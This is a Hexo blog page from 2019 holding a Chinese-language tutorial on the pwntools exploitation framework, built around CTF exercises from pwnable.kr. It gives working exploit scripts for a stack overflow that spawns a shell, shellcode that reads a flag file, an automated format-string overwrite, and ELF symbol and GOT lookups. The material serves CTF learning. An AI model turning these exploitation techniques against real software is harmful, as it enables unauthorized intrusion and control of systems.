@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="pwntools是一个二进制利用框架。官方文档提供了详细的api规范。由于本文只是用来介绍pwntools使用方法，不会过于详细的讲解各种二进制漏洞攻击技术。 Pwntools的“Hello World”栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。 1#include &amp;lt;stdio.h&amp;gt;``#include &amp;lt;strin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWNTOOLS的使用">
+<meta property="og:url" content="http://yoursite.com/2019/09/14/PWNTOOLS╡─╩╣╙├/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="pwntools是一个二进制利用框架。官方文档提供了详细的api规范。由于本文只是用来介绍pwntools使用方法，不会过于详细的讲解各种二进制漏洞攻击技术。 Pwntools的“Hello World”栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。 1#include &amp;lt;stdio.h&amp;gt;``#include &amp;lt;strin">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://bbs.pediy.com/upload/attach/201901/3_3KDCPDBYDBFWSMH.png">
+<meta property="og:image" content="https://bbs.pediy.com/upload/attach/201901/3_QGGWTB3XTZ6JTC5.png">
+<meta property="og:updated_time" content="2019-09-15T07:09:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PWNTOOLS的使用">
+<meta name="twitter:description" content="pwntools是一个二进制利用框架。官方文档提供了详细的api规范。由于本文只是用来介绍pwntools使用方法，不会过于详细的讲解各种二进制漏洞攻击技术。 Pwntools的“Hello World”栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。 1#include &amp;lt;stdio.h&amp;gt;``#include &amp;lt;strin">
+<meta name="twitter:image" content="https://bbs.pediy.com/upload/attach/201901/3_3KDCPDBYDBFWSMH.png">
+  <link rel="canonical" href="http://yoursite.com/2019/09/14/PWNTOOLS╡─╩╣╙├/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>PWNTOOLS的使用 | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/PWNTOOLS╡─╩╣╙├/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">PWNTOOLS的使用
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-09-14 09:09:08" itemprop="dateCreated datePublished" datetime="2019-09-14T09:09:08-07:00">2019-09-14</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-09-15 00:09:36" itemprop="dateModified" datetime="2019-09-15T00:09:36-07:00">2019-09-15</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>pwntools</strong>是一个二进制利用框架。官方文档提供了详细的<strong>api</strong>规范。由于本文只是用来介绍<strong>pwntools</strong>使用方法，不会过于详细的讲解各种二进制漏洞攻击技术。</p>
+<h2 id="Pwntools的“Hello-World”"><a href="#Pwntools的“Hello-World”" class="headerlink" title="Pwntools的“Hello World”"></a>Pwntools的“Hello World”</h2><p>栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;``#include &lt;string.h&gt;``#include &lt;stdlib.h&gt;``void func(``int` `key)&#123;``    ``char overflowme[``32``];``    ``printf(``&quot;overflow me : &quot;``);``    ``gets(overflowme);    ``/``/` `smash me!``    ``if``(key ``=``=` `0xcafebabe``)&#123;``        ``system(``&quot;/bin/sh&quot;``);``    ``&#125;``    ``else``&#123;``        ``printf(``&quot;Nah..\n&quot;``);``    ``&#125;``&#125;``int` `main(``int` `argc, char``*` `argv[])&#123;``    ``func(``0xdeadbeef``);``    ``return` `0``;``&#125;</span><br></pre></td></tr></table></figure>
+
+<p>pwntools脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*``c ``=` `remote(``&quot;pwnable.kr&quot;``, ``9000``) ``c.sendline(``&quot;AAAA&quot;` `*` `13` `+` `p32(``0xcafebabe``))``c.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>源码简洁明了，我们只需要将<strong>key</strong>改写成<code>0xcafebabe</code>。</p>
+<p>现在我们重新看回pwntools脚本。第一行将pwntools提供的工具引入到我们的python上下文中。</p>
+<p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code> 会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 <code>c</code>). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p>
+<ul>
+<li><code>send(payload)</code> 发送payload</li>
+<li><code>sendline(payload)</code> 发送payload，并进行换行（末尾<strong>\n</strong>）</li>
+<li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li>
+<li><code>recvn(N)</code> 接受 N(数字) 字符</li>
+<li><code>recvline()</code> 接收一行输出</li>
+<li><code>recvlines(N)</code> 接收 N(数字) 行输出</li>
+<li><code>recvuntil(some_string)</code> 接收到 some_string 为止</li>
+</ul>
+<p>在第三行中, <code>p32()</code> 可以让我们转换整数到小端序格式. <code>p32</code> 转换4字节. <code>p64</code> 和 <code>p16</code> 则分别转换 8 bit 和 2 bit 数字. <code>c.sendline</code> 将我们的payload发送到远程主机. <code>&quot;AAAA&quot; * 14</code> 是我们到<strong>key</strong>的偏移量. Pwntools 不能自动运算偏移量，用户需要自行计算。</p>
+<p>最后，我们成功getshell了. 这时，你可能想发送命令进行交互. <code>c.interactive()</code> 允许我们在终端里将命令传送到远程服务器. Pwntools 会自动接收输出并回显 .</p>
+<p><img src="https://bbs.pediy.com/upload/attach/201901/3_3KDCPDBYDBFWSMH.png" alt="图片描述"></p>
+<h2 id="写-Shellcode"><a href="#写-Shellcode" class="headerlink" title="写 Shellcode"></a>写 Shellcode</h2><p>下一题是pwnable.kr的asm. 你需要用 <code>ssh -p2222 asm@pwnable.kr</code> 并输入密码 <code>guest</code> 来查看可执行文件和源码. 这里，我们只展示利用代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*` `p ``=` `process(``&quot;./asm&quot;``)``context.log_level ``=` `&apos;DEBUG&apos;``gdb.attach(p)` `context(arch``=``&apos;amd64&apos;``, os``=``&apos;linux&apos;``)` `shellcode ``=` `shellcraft.amd64.pushstr(``&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;``)``shellcode ``+``=` `shellcraft.amd64.linux.``open``(``&apos;rsp&apos;``,``0``,``0``)``shellcode ``+``=` `shellcraft.amd64.linux.read(``&apos;rax&apos;``,``&apos;rsp&apos;``,``0``)``shellcode ``+``=` `shellcraft.amd64.linux.write(``1``, ``&apos;rsp&apos;``, ``100``)` `p.recvuntil(``&apos;shellcode: &apos;``)``p.send(asm(shellcode))``log.success(p.recvall())</span><br></pre></td></tr></table></figure>
+
+<p>我们这里用到了新的api: <code>process()</code>, <code>contex.log_level</code>, <code>gdb.attach</code>, 和 <code>shellcraft</code>.<br><code>process</code> 和 <code>remote</code> 累死.  <code>remote</code> 连接远程主机, <code>process</code> 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, <code>process</code> 返回的对象可以通过 <code>gdb.attach(p)</code> 将进程attach到gdb上. Attach 之后,  gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编).</p>
+<p><img src="https://bbs.pediy.com/upload/attach/201901/3_QGGWTB3XTZ6JTC5.png" alt="图片描述"></p>
+<blockquote>
+<p>提醒一下，如果你想在命令行中使用gdb.attach(), 便需要安装并运行 tmux. <a href="https://hackernoon.com/a-gentle-introduction-to-tmux-8d784c404340" target="_blank" rel="noopener">更多关于tmux的信息</a>.</p>
+</blockquote>
+<p>当我们想查看服务器输出时，并不需要在每个 <code>recvline</code> 或者 <code>recvuntil</code> 前加 <code>print</code>. 当 <code>context.log_level</code> 被设置为 <code>&quot;DEBUG&quot;</code> , 我们的输入和服务器的输出会被直接输出.</p>
+<p><code>shellcraft</code> 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 <em>open</em> 了一个文件并 <em>read</em> 文件到 <em>stdout</em>. 关于这个类更多的文档, 你可以查阅 <a href="http://docs.pwntools.com/en/stable/shellcraft.html" target="_blank" rel="noopener">官方文档</a>.</p>
+<h2 id="格式化漏洞自动化"><a href="#格式化漏洞自动化" class="headerlink" title="格式化漏洞自动化"></a>格式化漏洞自动化</h2><p>我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*``import` `tempfile` `program ``=` `tempfile.mktemp()``source  ``=` `program ``+` `&quot;.c&quot;``write(source, ``&apos;&apos;&apos;``#include &lt;stdio.h&gt;``#include &lt;stdlib.h&gt;``#include &lt;unistd.h&gt;``#include &lt;sys/mman.h&gt;``#define MEMORY_ADDRESS ((void*)0x11111000)``#define MEMORY_SIZE 1024``#define TARGET ((int *) 0x11111110)``int main(int argc, char const *argv[])``&#123;``       ``char buff[1024];``       ``void *ptr = NULL;``       ``int *my_var = TARGET;``       ``ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);``       ``if(ptr != MEMORY_ADDRESS)``       ``&#123;``               ``perror(&quot;mmap&quot;);``               ``return EXIT_FAILURE;``       ``&#125;``       ``*my_var = 0x41414141;``       ``write(1, &amp;my_var, sizeof(int *));``       ``scanf(&quot;%s&quot;, buff);``       ``dprintf(2, buff);``       ``write(1, my_var, sizeof(int));``       ``return 0;``&#125;&apos;&apos;&apos;``)``cmdline ``=` `[``&quot;gcc&quot;``, source, ``&quot;-Wno-format-security&quot;``, ``&quot;-m32&quot;``, ``&quot;-o&quot;``, program]``process(cmdline).wait_for_close()``def` `exec_fmt(payload):``    ``p ``=` `process(program)``    ``p.sendline(payload)``    ``return` `p.recvall()` `autofmt ``=` `FmtStr(exec_fmt)``offset ``=` `autofmt.offset``p ``=` `process(program, stderr``=``PIPE)``addr ``=` `u32(p.recv(``4``))``payload ``=` `fmtstr_payload(offset, &#123;addr: ``0x1337babe``&#125;)``p.sendline(payload)``print` `hex``(unpack(p.recv(``4``)))</span><br></pre></td></tr></table></figure>
+
+<p>有了 <code>FmtStr</code>, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 <code>autofmt</code>. 这个对象包含 <code>offset</code>, 即算好的偏移量. <code>fmtstr_payload(offset, {address: value})</code> 帮我们生成最后的payload. 第一个参数 <code>offset</code> 用 <code>autofmt.offset</code> 算好的即可. 然后, 我们需要声明 <code>{address: value}</code> 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址: <code>{address1: value1, address2:value2,..., address: valueN}</code>.</p>
+<p>有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload <a href="http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload" target="_blank" rel="noopener">fmtstr_payload</a>.</p>
+<h2 id="使用-ELF"><a href="#使用-ELF" class="headerlink" title="使用 ELF()"></a>使用 ELF()</h2><p>有些题目给了我们libc. 用 <code>gdb&gt; x function1 — function2</code> 算偏移量太麻烦了, 因此有了 <code>ELF</code>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from` `pwn ``import` `*` `e ``=` `ELF(``&apos;./example_file&apos;``)``print` `hex``(e.address)  ``# 0x400000``print` `hex``(e.symbols[``&apos;write&apos;``]) ``# 0x401680``print` `hex``(e.got[``&apos;write&apos;``]) ``# 0x60b070``print` `hex``(e.plt[``&apos;write&apos;``]) ``# 0x401680``offset ``=` `e.symbols[``&apos;system&apos;``] ``-` `e.symbols[``&apos;printf&apos;``] ``# calculate offset``binsh_address ``=` `next``(e.search(``&apos;/bin/sh\x00&apos;``)) ``# find address which contains /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>和 <code>process()</code> 一样, 我们只用将路径给 <code>ELF(path)</code> 即可分析 ELF.</p>
+<p>我们有以下几种方法操纵ELF:</p>
+<ul>
+<li><code>symbols[&#39;a_function&#39;]</code> 找到 <code>a_function</code> 的地址</li>
+<li><code>got[&#39;a_function&#39;]</code> 找到 <code>a_function</code>的 got </li>
+<li><code>plt[&#39;a_function&#39;]</code> 找到 <code>a_function</code> 的 plt</li>
+<li><code>next(e.search(&quot;some_characters&quot;))</code> 找到包含 <code>some_characters</code>（字符串，汇编代码或者某个数值）的地址. </li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Pwntools 是一套十分强大的工具. 在本文中, 我介绍了最常用的几个api, 但 pwntools 还有很多其他强大的api，诸如 qemu, adb. 各位可通过官方文档进行剩余的学习</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/09/10/╗ñ═°▒¡2019-MISC-baby-forensic/" rel="next" title="护网杯2019-MISC-baby_forensic">
+                  <i class="fa fa-chevron-left"></i> 护网杯2019-MISC-baby_forensic
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/09/14/Pro╚δ├┼▒╩╝╟/" rel="prev" title="菜鸟IdaPro入门笔记">
+                  菜鸟IdaPro入门笔记 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwntools的“Hello-World”"><span class="nav-number">1.</span> <span class="nav-text">Pwntools的“Hello World”</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写-Shellcode"><span class="nav-number">2.</span> <span class="nav-text">写 Shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#格式化漏洞自动化"><span class="nav-number">3.</span> <span class="nav-text">格式化漏洞自动化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用-ELF"><span class="nav-number">4.</span> <span class="nav-text">使用 ELF()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
